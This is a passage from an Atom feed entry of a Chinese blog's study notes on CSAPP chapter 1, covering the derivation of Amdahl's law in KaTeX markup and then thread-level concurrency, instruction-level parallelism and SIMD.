class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，现在所需的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>α</mi><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><mi>k</mi></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\dfrac{\alpha T_{old}}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。因此，总的执行时间应为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>T</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><mo>+</mo><mfrac><mrow><mi>α</mi><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub></mrow><mi>k</mi></mfrac><mo>=</mo><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><mo stretchy="false">[</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><mo>+</mo><mfrac><mi>α</mi><mi>k</mi></mfrac><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">T_{new} = (1 - \alpha)T_{old} + \frac{\alpha T_{old}}{k} = T_{old}[(1-\alpha) + \frac{\alpha}{k}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">]</span></span></span></span></span></p><p>由此可以计算得到加速比</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mo>=</mo><mfrac><msub><mi>T</mi><mrow><mi>o</mi><mi>l</mi><mi>d</mi></mrow></msub><msub><mi>T</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>α</mi><mo stretchy="false">)</mo><mo>+</mo><mfrac><mi>α</mi><mi>k</mi></mfrac></mrow></mfrac></mrow><annotation encoding="application/x-tex">S = \frac{T_{old}}{T_{new}} = \frac{1}{(1-\alpha) + \frac{\alpha}{k}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.19633em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.35244em;vertical-align:-1.0310000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0310000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="并发和并行">并发和并行</h3><p>术语<strong>并发</strong>是一个通用的概念，指一个同时具有多个活动的系统；而属于<strong>并行</strong>指的是用并发来使得一个系统运行得更快。并行可以在计算机系统的多个抽象层次中运用。按照系统层次结构中由高到低的顺序重点强调三个层次。</p><h4 id="线程级并发">线程级并发</h4><p>超线程（hyperthreading），有时称为同时多线程（simultaneous multi-threading），是一项<strong>允许一个CPU执行多个控制流</strong>的技术。</p><p>多核处理器是将多个CPU集成到一个集成电路芯片上，下图2描述的是一个典型的多核处理器的组织结构，其中微处理器芯片有4个CPU核，每个核都有自己的L1和L2高速缓存，其中L1高速缓存又分为<strong>数据高速缓存</strong>和<strong>指令高速缓存</strong>两部分。</p><p><img src="/img/csapp/1/%E5%A4%9A%E6%A0%B8%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84.png" alt="图2 多核处理器的组织结构"></p><p>常规的处理器需要约2000个时钟周期取做不同线程间的切换，而超线程处理器可以在单个周期的基础上决定要执行哪一线程。</p><p>多核处理器的使用可以从两方面提高系统性能：</p><ol><li>减少了执行多个任务时模拟并发的需要</li><li>可以使得应用程序运行更快</li></ol><h4 id="指令级并行">指令级并行</h4><p>在较低的抽象层次上，现代处理器<strong>可以同时执行多条指令的属性</strong>成为指令级并行。</p><p>如果处理器可以达到比一个周期一条指令更快的执行速率，就称之为超标量（superscalar）。</p><h4 id="单指令、多数据并行">单指令、多数据并行</h4><p>在最低层次上，许多现代处理器拥有特殊的硬件，允许一条指令产生多个可并行执行的操作，这种方式称为单指令、多数据，即SIMD执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;程序编译过程&quot;&gt;程序编译过程&lt;/h2&gt;
&lt;p&gt;假设已有&lt;code&gt;hello.c&lt;/code&gt;，代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class</summary>
      
    
    
    
    <category term="csapp" scheme="https://ruom0.github.io/categories/csapp/"/>
    
    
    <category term="csapp" scheme="https://ruom0.github.io/tags/csapp/"/>
    
  </entry>
  
</feed>
